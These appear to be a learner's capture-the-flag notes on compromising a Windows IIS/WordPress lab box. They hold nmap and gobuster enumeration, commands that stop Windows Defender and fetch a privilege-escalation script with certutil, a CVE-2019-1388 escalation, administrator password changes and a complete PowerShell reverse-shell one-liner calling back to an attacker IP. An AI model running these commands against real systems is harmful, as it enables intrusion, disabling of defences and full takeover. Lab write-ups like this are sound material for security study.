@@ -1,0 +1,108 @@
+Windowss IIS Server + Wordpress + CVE 
+
+1-Enumeration:
+     nmap -T5 -Pn -sC -sV 10.10.65.0 -oN enum/sanLogs1.logs  -vv
+        
+        PORT     STATE SERVICE       REASON  VERSION
+        80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
+        |_http-server-header: Microsoft-IIS/10.0
+        |_http-title: IIS Windows Server
+        | http-methods: 
+        |   Supported Methods: OPTIONS TRACE GET HEAD POST
+        |_  Potentially risky methods: TRACE
+        3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
+        |_ssl-date: 2024-01-30T00:56:15+00:00; 0s from scanner time.
+        | ssl-cert: Subject: commonName=RetroWeb
+        | Issuer: commonName=RetroWeb
+        | Public Key type: rsa
+        | Public Key bits: 2048
+        | Signature Algorithm: sha256WithRSAEncryption
+        | Not valid before: 2024-01-29T00:55:41
+        | Not valid after:  2024-07-30T00:55:41
+        | MD5:   6257:b685:67fa:b60e:417d:54aa:5dfe:d20b
+        | SHA-1: cc67:f6cc:f604:a0c0:c6ea:c38d:8efa:a519:29af:8aa2
+        | -----BEGIN CERTIFICATE-----
+        | 
+        |_-----END CERTIFICATE-----
+        | rdp-ntlm-info: 
+        |   Target_Name: RETROWEB
+        |   NetBIOS_Domain_Name: RETROWEB
+        |   NetBIOS_Computer_Name: RETROWEB
+        |   DNS_Domain_Name: RetroWeb
+        |   DNS_Computer_Name: RetroWeb
+        |   Product_Version: 10.0.14393
+        |_  System_Time: 2024-01-30T00:56:10+00:00
+        Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+        Host script results:
+        |_clock-skew: mean: 0s, deviation: 0s, median: 0s
+
+
+    Gobuster:
+        ┌──(kali㉿kali)-[~/Desktop/Windows_PrivEsc/Blaster_THM]
+        └─$ gobuster dir -u http://10.10.65.0/ -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee enum/gobuster-p80 log
+        ===============================================================
+        ===============================================================
+        /retro                (Status: 200) [Size: 30515]
+
+
+        Tron Arcade Cabinet by Wade
+
+        Passwd in "Ready Player One"
+
+        http://10.10.65.0/retro/wp-login.php --- It Works 
+
+        We have access to RDP also via the "wade" credentials
+
+    RDP ACCESS:
+        Enum FireWall or Anti Virus
+            sc query windefend
+
+            sc stop windefend
+
+        Powershell:
+            check version:
+                $PSVersionTable ; version 2 OK
+
+                C:\Users\Wade\Downloads>certutil -urlcache -f http://<Kali IP>/Steel_Mountain_THM/PrivescCheck.ps1 PrivescCheck.ps1
+                
+                C:\Users\Wade\Downloads>powershell -ep bypass . .\PrivescCheck.ps1; Invoke-PrivescCheck
+                ----> Defender doesn't detect PrivesCheck.ps1 
+
+            Privesc Path:
+                Name           : wlanapi.dll
+                Description    : Loaded by the Network Connections service (NetMan) when listing network interfaces.
+                RunAs          : LocalSystem
+                RebootRequired : False
+                Link           : https://itm4n.github.io/windows-server-netman-dll-hijacking/
+
+                | CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+                ┃ NAME     ┃ Latest updates installed                          ┃
+                ┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+                ┃ Check whether a Windows security update was installed within ┃
+                ┃ the last 31 days.                                            ┃
+                ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+                [*] Status: Vulnerable - Medium
+
+                HotFixID  Description InstalledBy         InstalledOn
+                --------  ----------- -----------         -----------
+                KB3192137 Update      NT AUTHORITY\SYSTEM 2016-09-12 - 04:30:26
+
+        C:\Users\Wade\Downloads>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+            OS Name:                   Microsoft Windows Server 2016 Standard
+            OS Version:                10.0.14393 N/A Build 14393
+            System Type:               x64-based PC
+
+            CVE-2019–1388: Windows Certificate Dialog Elevation of Privilege
+            -https://justinsaechao23.medium.com/cve-2019-1388-windows-certificate-dialog-elevation-of-privilege-4d247df5b4d7
+
+            It give to us nt authority system priv
+
+                change Admin password:
+                -https://answers.microsoft.com/en-us/windows/forum/all/cant-reset-forgotten-password-using-net-user/a8b44a62-3903-4023-9bf8-62b2eb237d2e
+                    net user administrator NewPassword
+
+                    net user authority/system adib
+
+        Powershell - Reverse shell One liner by Nikhi:
+            $client = New-Object System.Net.Sockets.TCPClient('10.6.1.162',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
